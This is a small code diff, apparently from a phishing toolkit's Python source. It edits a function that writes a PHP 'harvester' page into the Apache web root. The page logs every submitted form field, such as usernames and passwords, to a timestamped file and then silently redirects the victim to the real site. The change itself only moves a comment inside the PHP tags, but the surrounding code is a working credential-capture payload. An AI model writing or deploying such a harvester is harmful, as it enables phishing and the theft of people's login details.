@@ -498,7 +498,7 @@ def run():
         now = str(datetime.datetime.today())
         harvester_file = ("harvester_" + now + ".txt")
         filewrite.write(
-            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />\n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */""" % (harvester_file, RAW_URL))
+            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
